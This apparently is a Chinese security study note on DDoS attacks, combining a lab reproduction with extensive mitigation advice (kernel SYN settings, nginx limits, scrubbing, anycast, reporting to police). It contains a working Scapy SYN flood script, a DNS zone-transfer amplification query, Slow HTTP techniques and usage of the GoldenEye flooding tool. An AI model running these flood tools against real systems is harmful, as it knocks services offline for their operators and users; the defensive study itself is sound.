---
title: "小议DDoS攻击"
slug: vads9k
translationKey: vads9k
date: 2020-08-03T12:51:38+08:00
source: yuque/penetration
---

每季度一次的“专项学习”，选择了老生常谈的主题：DDoS，希望可以给各位带来一些启发。



为避免各位看官太长不看，我直接上结论：

1. DDoS攻击的防护，是一项系统工程，**没有一种方法绝对有效**，是为`No silver bullet`。简单来说，系统架构、基础设施流量、业务逻辑、灾难预案等方面，在防DDoS方面均要下功夫。可参考本文的[遇到DoS时怎么办](#D3l2M)部分
2. 攻击趋势
    1. 常见的DDoS：SYN大包攻击（核心原理：`资源耗尽`）、TCP/UDP反射型（核心原理：`源IP伪造`）
    2. 游戏仍然是DDoS攻击最集中的行业，占整体分布的`39%`，另外直播、电商等行业也成为DDoS攻击的新目标
3. **已备案的正规业务，如果被DDoS的流量在100G以上，可以报案。**可参考本文的[4 反制溯源](#VsV7z)部分



---

# 一、DDoS是什么
> <font style="color:#333333;">DDOS(Distributed Denial of Service)，又称分布式拒绝服务攻击。骇客通过控制多个肉鸡或服务器组成的僵尸网络，对目标发送大量看似合法请求，从而占用大量网络资源，瘫痪网络，阻止用户对网络资源的正常访问。</font>
>

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1625105257635-7ed0d2f4-fc35-4d07-aab6-775dc6cc3fe9.png)

<font style="color:#333333;">尤其是反射性DDoS攻击的出现，为DDoS攻击产业提供了“核武器”，将攻击流量放大近万倍，最高可达5万倍，其杀伤力可见一斑。</font>



![](https://cdn.nlark.com/yuque/0/2021/png/166008/1623219400167-8f7f5748-58d4-439b-87b5-ad56756ce5ba.png)

Source: Verizon.

在 Verizon 的“[2018 年数据泄露调查报告](https://www.researchgate.net/publication/324455350_2018_Verizon_Data_Breach_Investigations_Report)”收集的数据中，DDoS是第一大最常见的安全事件向量。

## 0x01 为什么会存在DDoS
> 意识形态分歧
>
> 网络战
>
> 敲诈勒索
>
> 商业不和
>

### （1）同行互相竞争


援引分析机构[TOMsInsight](https://www.zhihu.com/column/tomsinsight)的分析报告（点[这里](https://zhuanlan.zhihu.com/p/28698605)直达）

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1596430707216-22a1e8a7-8748-477d-8432-f8e8ab6d885e.png)



![](https://cdn.nlark.com/yuque/0/2020/png/166008/1596430338545-472e277d-d019-4791-b787-fd1c7b9a4858.png)

### （2）恶性循环
![](https://cdn.nlark.com/yuque/0/2020/png/166008/1596430859066-f5a2f1d6-3ed1-407b-b685-2f5be4806176.png)

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1596430309094-f1adf796-8b93-4897-be43-6806fb9a02b7.png)



![](https://cdn.nlark.com/yuque/0/2020/png/166008/1596430790876-36a56990-a294-47b9-a102-1875c14729c0.png)



## 0x02 DoS有哪些
### 协议攻击
SYN Flood

### 应用层攻击
SMTP、HTTP、DNS 或 HTTPS

### 体量攻击（Volumetric Attacks）
Internet 控制消息协议 (ICMP) 和用户数据报协议 (UDP) 

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1622445799251-07078130-72c3-46fb-85a2-8772848b2d6e.png)

普通人没什么好害怕的，但大公司是主要目标。由于 DDoS 攻击导致停机，他们可能会损失数百万或数十亿美元。小型企业主也可能遭受重大损失。



# 二、DoS攻击模拟
下面的内容，是[DDOS攻击模拟复现 - 先知社区](https://xz.aliyun.com/t/70#toc-1)一文的复现。

## 0x01 SYN Flood
> SYN FLOOD攻击的原理就是阻断TCP三次握手的第三次ACK包，即不对服务器发送的SYN+ACK数据包做出应答。由于服务器没有收到客户端发来的确认响应，就会一直保持连接直到超时，当有大量这种半开连接建立时，即造成SYN Flood攻击。
>

### （1）攻击测试
下面是一段多线程SYN Flood的脚本Demo

```bash
# 01_sys_flood.py
# coding:utf-8

from scapy.all import *
from time import sleep
import _thread
import random

def syn_flood(ip, port):
	while True:
		rand = random.randint(0, 65535)
		send(IP(dst=ip)/TCP(dport=port, sport=rand), verbose=0)

def main():
	if len(sys.argv) != 4:
		print("参数错误, 用法如下")
		print("python syn_flood.py [IP] [Port] [Thread]")
		sys.exit()

ip     = sys.argv[1]
port   = int(sys.argv[2])
thread_count = int(sys.argv[3])

print("[!]SYN Flood start!")
for i in range(thread_count):
	_thread.start_new_thread(syn_flood, (ip, port))

while 1:
	sleep(1)
```

Wireshark抓包情况

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1623312187588-b197b9fb-28c6-46c2-aac8-826113145744.png)

可以看到服务器建立了大量的半连接

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1623312714139-73bd6356-a085-4bbb-b780-35934ffb2b52.png)

网站也访问不了......

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1623313467033-2465f407-3544-4cc5-aece-62384a7eccf0.png)

### （2）缓解SYN_Flood攻击的设置
**tcp_syncookies**

> + 在服务器资源不足的情况下，尽量不要拒绝TCP的syn请求，尽量把syn请求缓存起来，留着过会儿有能力的时候处理这些TCP的连接请求。
> + 如果并发量真的非常非常高，打开这个其实用处不大。
>

实测：配置`**tcp_syncookies=1**`后，50个线程还顶得住（指80端口能正常访问），调到1000个线程后，一样拉跨。

**tcp_synack_retries & tcp_syn_retries**

这俩的默认值都是`5`，再将它们降低到`3`后，5个线程的SYN Flood竟然能扛住了！

```bash
net.ipv4.tcp_synack_retries = 3
net.ipv4.tcp_syn_retries = 3
```

### （3）结论
总而言之，Ubuntu的默认配置下，甚至连5个线程都扛不住。

但是，在下面的配置下，1000个线程都随便顶。

```bash
# 增加SYN队列长度到10240：
sysctl -w net.ipv4.tcp_max_syn_backlog=10240

# 打开SYN COOKIE功能：
sysctl -w net.ipv4.tcp_syncookies=1

# 降低重试次数：
sysctl -w net.ipv4.tcp_synack_retries=3 
sysctl -w net.ipv4.tcp_syn_retries=3
```

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1623315220929-08254d04-e0a8-4869-8154-5a387535b307.png)

当然，我承认，这种测量方法相当粗糙，但不难看出这种缓解方案的效果。

参考：

+ [https://huangwang.github.io/2019/10/30/Linux%E9%98%B2SYN-Flood%E6%94%BB%E5%87%BB%E7%9A%84%E6%96%B9%E6%B3%95/](https://huangwang.github.io/2019/10/30/Linux%E9%98%B2SYN-Flood%E6%94%BB%E5%87%BB%E7%9A%84%E6%96%B9%E6%B3%95/)



### （4）其它TCP攻击
畸形TCP数据包，是利用TCP的“标记位”（FLAG）自身的规则，来判别是否畸形，如六个标志位全为1/全为0等。

## 0x02 DNS放大攻击
> DNS放大攻击的原理：
>
> 伪造DNS数据包，向DNS服务器发送域名查询报文，而DNS服务器返回的应答报文则会发送给被攻击主机。
>
> 放大体现在请求DNS回复的类型为**ANY**，攻击者向服务器请求的包长度为69个字节，而服务器向被攻击主机回复的ANY类型DNS包长度为535字节，大约放大了7倍。————————————————
>

正常 DNS 查询： **源 IP 地址** -----DNS 查询----> DNS 服务器 -----DNS 回复包----> **源 IP 地址**

攻击 DNS 查询： **伪造 IP 地址** -----DNS 查询----> DNS 服务器 -----DNS 回复包---->** 伪造的 IP 地址（攻击目标）**



首先，抓一下正常DNS查询的流量

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1623317882543-e36c881e-7d6f-4797-9b2a-d5e9a7c372ff.png)

注意：请求的大小是：106，

响应的大小是：543；

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1623317869893-9f586e3b-b3df-42f7-b041-1293027d7abe.png)

两者的比值是整整五倍！那么假设我是个想搞DoS的攻击者，本地带宽只有10 Mbps，那只要通过伪造源IP的方式，去不断请求DNS服务器，就能将“攻击带宽”放大到50 Mbps，真可谓“借刀杀人”、“四两拨千斤”啊。

### 一种推测
要是有域传送漏洞，岂不是子域名个数越多、返回的数据量越大，千倍万倍的流量，用来DoS，岂不是美滋滋。

于是扒了一下[rfc1035](https://datatracker.ietf.org/doc/html/rfc1035)，指定`qtype=252`即可

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1623320249083-2968facf-9e6e-4d56-9e82-a29e3e741106.png)

```bash
from  scapy.all import * 

i=IP(dst='[DNS_Server]')
u =UDP()
q =DNSQR(qname="[Vuln_Domain]", qtype=252)
d = DNS(rd=1, qdcount=1, qd=q)
r = (i/u/d)
sr1(r)
```

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1623320537920-ef68d60d-b172-4c98-be8d-61d635108b55.png)

## 0x03 HTTP攻击


**Slow Headers**

+ 一直不发送`\r\n`结束头，使服务器保持连接。



Slow HTTP

+ 指定一个很大的`Content-Length`，以很慢的速度发送。
+ 具体实现的话，可以参考分块编码

> [https://datatracker.ietf.org/doc/html/rfc2616.html#page-25](https://datatracker.ietf.org/doc/html/rfc2616.html#page-25)    
>

> [https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Transfer-Encoding](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Transfer-Encoding)
>

> **分块编码**主要应用于如下场景，即要传输大量的数据，但是在请求在没有被处理完之前响应的长度是无法获得的。例如，当需要用从数据库中查询获得的数据生成一个大的HTML表格的时候，或者需要传输大量的图片的时候。
>
> 数据以一系列分块的形式进行发送。 `Content-Length` 首部在这种情况下不被发送。。在每一个分块的开头需要添加当前分块的长度，以十六进制的形式表示，后面紧跟着 '\r\n' ，之后是分块本身，后面也是'\r\n' 。终止块是一个常规的分块，不同之处在于其长度为0。终止块后面是一个挂载（trailer），由一系列（或者为空）的实体消息首部构成。
>

一个分块响应形式如下：

```plain
Transfer-Encoding: chunked
	



HTTP/1.1 200 OK
Content-Type: text/plain
Transfer-Encoding: chunked

7\r\n
Mozilla\r\n
9\r\n
Developer\r\n
7\r\n
Network\r\n
0\r\n
\r\n
```

## 0x04 脚本小子工具-GoldenEye
[https://github.com/jseidl/GoldenEye](https://github.com/jseidl/GoldenEye)

```plsql
 USAGE: ./goldeneye.py <url> [OPTIONS]

 OPTIONS:
    Flag           Description                     Default
    -u, --useragents   File with user-agents to use                     (default: randomly generated)
    -w, --workers      Number of concurrent workers                     (default: 50)
    -s, --sockets      Number of concurrent sockets                     (default: 30)
    -m, --method       HTTP Method to use 'get' or 'post'  or 'random'  (default: get)
    -d, --debug        Enable Debug Mode [more verbose output]          (default: False)
    -n, --nosslcheck   Do not verify SSL Certificate                    (default: True)
    -h, --help         Shows this help
```

运行截图

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1624437227769-3f43c7c8-fcc5-4693-9243-32d1396f6bb7.png)

80端口的网页直接无法打开

>  Wireshark中，黑底红字的数据包，是TCP错误包或者校验和错误的包。. 
>

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1624437155849-bf553bc8-0a42-4804-aae0-a3f0be5a3268.png)



---

# 三、遇到DoS时怎么办
## （0）在设计之初
+ 引入端口敲门的机制，参考零信任SDP中的SPA，端口敲门，See：[https://zhuanlan.zhihu.com/p/163799770](https://zhuanlan.zhihu.com/p/163799770)
+ 考虑准备足够的带宽，或至少需要确定备选方案
+ DoS的应急预案，主要是人员、权责的划分
+ **分级策略**
    1. 对于平台而言，有些服务被DDOS会导致全站服务不可用，例如DNS不可用则相当于全线服务不可用
    2. 对于强账号体系应用例如电商、游戏等如果SSO登陆不可用则全线服务不可用，攻击者只要击垮这些服务就能“擒贼擒王”，所以安全上也需要考虑针对不同的资产使用不同等级的保护策略，根据BCM（业务持续性）的要求，先将资产分类分级，划分出不同的可用性SLA要求，然后根据不同的SLA实施不同级别的防护，在具体防护策略上，能造成平台级SPOF（单点故障）的服务或功能应投入更高成本的防御措施，所谓更高成本不仅指购买更多的ADS设备，同时可能建立多灾备节点，并且在监控和响应优先级上应该更高。
    3. 配套的DRP&BCP策略集，并且需要真实的周期性的演练，意在遇到超大流量攻击时能够从容应对。
    4. 业务连续性计划 (`BCP`) ，参考[BSI案例分析 联想集团 中国.pdf](https://www.bsigroup.com/LocalFiles/zh-cn/%e6%88%90%e5%8a%9f%e6%a1%88%e4%be%8b/BSI%e6%a1%88%e4%be%8b%e5%88%86%e6%9e%90%20%e8%81%94%e6%83%b3%e9%9b%86%e5%9b%a2%20%e4%b8%ad%e5%9b%bd.pdf)



## （1）分析流量特点，选择性过滤
> DDOS攻击本质上是一种只能缓解而不能完全防御的攻击，它不像漏洞那样打个补丁解决了就是解决了，DDOS就算购买和部署了当前市场上比较有竞争力的防御解决方案也完全谈不上彻底根治。
>

在【0x03 脚本小子工具-GoldenEye】中，我们可以从以下角度分析其流量的特征：

+ 请求头
    - Referer
    - UA
+ 请求体
    - 参数字符集
    - 参数长度

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1624437852227-09a4d5df-be22-490d-8bfe-9b2d329ddad4.png)

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1624437825161-4a0c77a9-0ce9-4d16-89be-cff55fa45b75.png)

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1624437778920-8be71988-5f21-4334-b834-f5c462fe1bf2.png)

所以，这款工具的作者，在2014年发现了工具被人找到的规律后，调整了生成规则，参考[https://wroot.org/posts/goldeneye-2-1-released-with-even-more-randomness/](https://wroot.org/posts/goldeneye-2-1-released-with-even-more-randomness/)



下面的是NSFOCUS的ADS设备的规则编辑界面，payload可自定义

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1632753241135-b4e5e469-1b89-4af2-a808-f6251217f28b.png)

一般安全团队能力尚可的话，可以通过运行POC exploit，然后抓包找出攻击payload的特征，编辑16进制的匹配规则，即可简单的实现人工定制。





## （2）BlackHole（黑洞）
![](https://cdn.nlark.com/yuque/0/2021/png/166008/1632752028796-3de1b1ac-f612-4090-b0f3-1d245c2ccdeb.png)

很多攻击持续的时间非常短，通常5分钟以内，流量图上表现为突刺状的脉冲。

之所以这样的攻击流行是因为“`打-打-停-停`”的效果最好，刚触发防御阈值，防御机制开始生效攻击就停了，周而复始。

蚊子不叮你，却在耳边飞，刚开灯想打它就跑没影了，当你刚关灯它又来了，你就没法睡觉。

目前如中国电信的专门做抗DDOS的云堤提供了`[近源清洗]`和`[流量压制]`的服务，对于购买其服务的厂商来说可以自定义需要黑洞路由的IP与电信的设备联动，黑洞路由是一种简单粗暴的方法，除了攻击流量，部分真实用户的访问也会被一起黑洞掉，对用户体验是一种打折扣的行为，本质上属于为了保障留给其余用户的链路带宽的弃卒保帅的做法，之所以还会有这种收费服务，是因为假如不这么做，全站服务会对所有用户彻底无法访问。

对于云清洗厂商而言，实际上也需要借助黑洞路由与电信联动。

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1632752538412-9bbd426a-4960-4551-89c7-491f39e68c9a.png)









## （3）主机配置
### Nginx配置
See：Rate Limiting with NGINX and NGINX Plus [https://www.nginx.com/blog/rate-limiting-nginx/](https://www.nginx.com/blog/rate-limiting-nginx/)

+ [https://www.nginx.com/blog/mitigating-ddos-attacks-with-nginx-and-nginx-plus/](https://www.nginx.com/blog/mitigating-ddos-attacks-with-nginx-and-nginx-plus/)

**限制连接数**

您可以将单个客户端 IP 地址可以打开的连接数限制为适合真实用户的值。例如，您可以允许每个客户端 IP 地址打开不超过 10 个到您网站的/store区域的连接：

```powershell
limit_conn_zone $binary_remote_addr zone=addr:10m;

server {
    # ...
    location /store/ {
        limit_conn addr 10;
        # ...
    }
}
```

该`limit_conn_zone`指令配置一个名为addr的共享内存区域来存储对指定密钥的请求，在本例中（如上例所示）客户端 IP 地址`$binary_remote_addr. /store`块中的`limit_conn`指令引用共享内存区域，并从每个客户端 IP 地址设置最多 10 个连接。

**关闭慢速连接**

您可以关闭写入数据太少的连接，这可能表示尝试尽可能长时间地保持连接打开（从而降低服务器接受新连接的能力）。Slowloris 是此类攻击的一个示例。该client_body_timeout指令控制 NGINX 在写入客户端主体之间等待多长时间，并且该client_header_timeout 指令控制 NGINX 在写入客户端标头之间等待多长时间。两个指令的默认值都是 60 秒。此示例将 NGINX 配置为在客户端对标头或正文的写入之间等待不超过 5 秒：



```powershell
server {
    client_body_timeout 5s;
    client_header_timeout 5s;
    # ...
}
```

### iptables
本机防火墙    操作系统都带有软件防火墙，Linux 服务器一般使用 iptables。比如，拦截 IP 地址1.2.3.4的请求，可以执行下面的命令。

```powershell
$ iptables -A INPUT -s 1.2.3.4 -j DROP
```



---

# 四、业界主流治理、环节方案
## <font style="color:#333333;">1 攻击的治理</font>
<font style="color:#333333;">大部分的治理方法需要在DDoS发生之前就配置，并且需要世界范围内的网络运营商、网络公司和组织进行有效合作，才能较好地对抗DDoS。</font>

<font style="color:#333333;">评估DDoS防御的两个指标：</font>

+ <font style="color:#333333;">错误接受率（漏警）</font>
+ <font style="color:#333333;">错误拒绝率（虚警）</font>

<font style="color:#333333;">这些指标越小，防御DDoS的效果越好。</font>

### <font style="color:#333333;">（1）僵尸网络的治理</font>
<font style="color:#333333;">感染-样本-逆向分析-僵尸程序清除工具/通信拦截规则</font>



### <font style="color:#333333;">（2）</font>地址伪造攻击的治理
技术层面：CERT、IETF

1. **CERT Advisory CA-1996-21**
+ 从外部接口进入内部网络的数据包，但源地址属于内部网络（防止针对内网的攻击）
+ 从内部网络向外发送的数据包，但源地址不属于内部网络（防止对外网的攻击）



2. **RFC 2827**
+ 通过在下游路由器上实施入口流量过滤，检查数据包格式



3. **Unicast Reverse Path Forwarding**
+ 单播反向路径转发（Unicast RPF）
+ 路由器对进入的数据包检查源地址、源端口是否在路由表中，否则丢弃。
+ 可参考IETF BCP 84

### <font style="color:#333333;">（3）攻击反射点的治理</font>
<font style="color:#333333;">反射点类型：ACK、SNMP、NTP、CHARGEN、DNS（最普遍）</font><font style="color:#333333;">以最普遍的DNS反射点为例，有三类治理方法：</font>

1. **<font style="color:#333333;">Open Resolver Project验证</font>**

<font style="color:#333333;">DDoS风险：</font>

+ <font style="color:#333333;">DNS服务器可被任意地址访问</font>
+ <font style="color:#333333;">对于DNS查询请求的回应速度无限制</font>
1. **<font style="color:#333333;">安装Response Rate Limiting模块</font>**

<font style="color:#333333;">新增了响应速率限制（RRL）的增强功能，目的是缓解DDoS放大攻击。</font>

1. **<font style="color:#333333;">NIST SP 800-81</font>**

<font style="color:#333333;">安全域名部署指南，重在确保数据的完整性和来源认证。（未见对DDoS的治理）</font>

## <font style="color:#333333;">2 攻击的缓解</font>
> _<font style="color:#555555;">注意：是缓解，不是解决。</font>_
>

1. <font style="color:#333333;">系统优化和增加带宽，的确可以在小规模的DDoS中取得一定的效果。但一是边际递减明显、在DDoS带宽加大时收效甚微；二是不符合经济规律。</font>
2. <font style="color:#333333;">防火墙、入侵检测、入侵防御系统，不太能检测目前“基于合法数据包”的攻击流量。</font>

### <font style="color:#333333;">（1）流量稀释</font>
<font style="color:#333333;">单一的流量清洗，无法处理大规模的网络流量，因此需要在清洗前先进行流量稀释。</font>

<font style="color:#333333;">流量稀释方案</font>

1. <font style="color:#333333;">CDN，对抗“基于域名发起的DDoS”。</font>
2. <font style="color:#333333;">更有效的方式：Anycast。</font>
    1. <font style="color:#333333;">在任播寻址中，网络地址和网络节点是一对多的方式，每一个目的地址对于一群接收节点，但消息只会发送给拓扑结构上最近的节点。</font>
    2. <font style="color:#333333;">对无状态服务的Anycast，通常用来提供高可用性保障和负载均衡。</font>
    3. <font style="color:#333333;">高可用性。在Anycast组的某一个成员受到攻击时，负责报文转发的router可根据各个成员的响应时间来决定报文的转发情况，由于受攻击的成员无响应，所以报文不会转发过去，流量就被“稀释”到其他成员上了。</font>

### <font style="color:#333333;">（2）流量清洗</font>
<font style="color:#333333;">权衡：误报率、漏报率。</font>

<font style="color:#333333;">多种清洗技术同时运用：</font>

+ <font style="color:#333333;">IP信誉检查</font>
    - <font style="color:#333333;">优先丢弃IP信誉值低的数据包</font>
    - <font style="color:#333333;">极端=>IP黑名单机制</font>
+ <font style="color:#333333;">攻击特征匹配</font>
    - <font style="color:#333333;">提取攻击工具的特征</font>
    - <font style="color:#333333;">指纹识别（静态、动态）</font>
    - <font style="color:#333333;">学习新特征，丢弃老特征</font>
+ <font style="color:#333333;">速度检查与限制</font>
    - <font style="color:#333333;">请求数据包的频率和速度有明显异常</font>
    - <font style="color:#333333;">限制流速</font>
+ <font style="color:#333333;">TCP代理和验证</font>
+ <font style="color:#333333;">协议完整性验证</font>
    - <font style="color:#333333;">DNS协议，若域名解析请求的响应数据中Flags字段的</font><font style="color:#7A7A7A;">Truncated</font><font style="color:#333333;">位（TC）被置位，正常的客户端就会用TCP53端口重新发送郁闷解析请求。攻击工具为了提高效率，往往不会处理服务器的响应数据。</font>
    - <font style="color:#333333;">TC位，表示“可截断”。即使用UDP的响应报文大512B时，只截断返回前512B的内容。客户端通常会TCP重发原来查询请求。</font>
    - <font style="color:#333333;">HTTP协议。客户端是否跟苏302跳转，可作为依据。</font>
+ <font style="color:#333333;">客户端真实性验证</font>
    - <font style="color:#333333;">“挑战-应答式”的交互验证</font>
    - <font style="color:#333333;">HTTP中Javascript请求</font>
    - <font style="color:#333333;">验证码</font>

<font style="color:#333333;"></font>

<font style="color:#333333;">在华为的Anti-DDoS解决方案中，HTTP类的攻击可通过“源认证方式”进行校验。</font>

1. TCP/IP源认证
    - TCP代理
    - 首包丢弃校验
2. **应用层源认证**
    - 302重定向（无法防御僵尸浏览器）
    - Meta Refresh重定向
    - 307重定向（POST）
3. 用户源认证
    - 验证码。。。。

## <font style="color:#333333;">3 相关工作</font>
### <font style="color:#333333;">（1）客户端解题方案</font>
+ <font style="color:#333333;">服务端生成的问题应该无法通过并行计算求解。注意：基于hash的问题都不满足此要求</font>
+ <font style="color:#333333;">问题的区分度与难度</font>
+ <font style="color:#333333;">注意适配性（用户体验）</font>

### <font style="color:#333333;">（2）计算密集型客户端解题方案</font>
+ <font style="color:#333333;">需要客户端求解问题时消耗较多的处理器资源</font>
+ <font style="color:#333333;">「改进的时间锁问题」，抗并发，综合降低了成本</font>

### <font style="color:#333333;">（3）内存密集型方案</font>
+ <font style="color:#333333;">求解速度依赖于计算机硬件的处理速度</font>

<font style="color:#333333;">结论：「改进的时间锁」整体性能良好=>可作为进一步分析的基础。</font>

### <font style="color:#333333;">（4）算法实现</font>
<font style="color:#333333;">MikroTik路由器。</font>

<font style="color:#333333;">生日攻击与生日悖论</font>

<font style="color:#333333;">流量模型：</font>

+ <font style="color:#333333;">计算机通信，通常是突发模式。</font>

  


## 4 反制&&溯源
目前对于流量在100G以上的攻击是可以立案的，这比过去幸福了很多。过去没有本土特色的资源甚至都没法立案，但是立案只是万里长征的第一步，如果你想找到人，必须成功完成以下步骤：



1. <font style="color:#8C8C8C;">在海量的攻击中，寻找倒推的线索，找出可能是C&C服务器的IP或相关域名等</font>
2. <font style="color:#8C8C8C;">“黑”吃“黑”，端掉C&C服务器</font>
3. <font style="color:#8C8C8C;">通过登录IP或借助第三方APT的大数据资源（如果你能得到的话）物理定位攻击者</font>
4. <font style="color:#8C8C8C;">陪叔叔们上门抓捕</font>
5. <font style="color:#8C8C8C;">上法庭诉讼</font>



如果这个人没有特殊身份，也许你就能如愿，但假如遇到一些特殊人物，你几个月都白忙乎。而黑吃黑的能力则依赖于安全团队本身的渗透能力比较强，且有闲情逸致做这事。这个过程对很多企业来说成本还是有点高，光有实力的安全团队这条门槛就足以砍掉绝大多数公司。笔者过去也只是恰好有缘遇到了这么一个团队。





---

# 五、reference
+ 互联网黑市分析： DDoS 启示录[https://zhuanlan.zhihu.com/p/28698605](https://zhuanlan.zhihu.com/p/28698605)
+ 中国香港地区 DDoS-botnet 分析报告 - 先知社区[https://xz.aliyun.com/t/2515](https://xz.aliyun.com/t/2515)
+ 【推荐阅读】DDOS 攻击的防范教程 [http://www.ruanyifeng.com/blog/2018/06/ddos.html](http://www.ruanyifeng.com/blog/2018/06/ddos.html)
+ 经历过DDOS的"洗礼"，你还好么？ [https://www.xuecaijie.com/it/183.html](https://www.xuecaijie.com/it/183.html)
+ How To Prevent DDoS Attacks? [https://hostnoc.com/how-to-prevent-ddos-attacks/](https://hostnoc.com/how-to-prevent-ddos-attacks/)
+ What is a DDoS Attack and How to Prevent One in 2021 [https://www.safetydetectives.com/blog/what-is-a-ddos-attack-and-how-to-prevent-one-in/](https://www.safetydetectives.com/blog/what-is-a-ddos-attack-and-how-to-prevent-one-in/)
+ DDoS Attacks Up 31% in Q1 2021: Report [https://beta.darkreading.com/attacks-breaches/ddos-attacks-up-31-in-q1-2021-report](https://beta.darkreading.com/attacks-breaches/ddos-attacks-up-31-in-q1-2021-report)
+ Rate Limiting with NGINX and NGINX Plus [https://www.nginx.com/blog/rate-limiting-nginx/](https://www.nginx.com/blog/rate-limiting-nginx/)
+ [浅析大规模DDOS防御架构-应对T级攻防 – ayazero | 漏洞人生](https://www.vuln.cn/6950)
+ [对抗DDoS攻击的法律武器 - FreeBuf网络安全行业门户](https://www.freebuf.com/geek/229421.html)
+ [遭受DDoS攻击后如何向网监报案](https://tech.antfin.com/docs/2/58734?spm=a2c4g.11186623.2.8.uhGQXh)
+ [https://mp.weixin.qq.com/s/28jH5IPjCjRvj57MjEHqpg](https://mp.weixin.qq.com/s/28jH5IPjCjRvj57MjEHqpg)
+ [http://blog.nsfocus.net/2021-ddos/](http://blog.nsfocus.net/2021-ddos/)

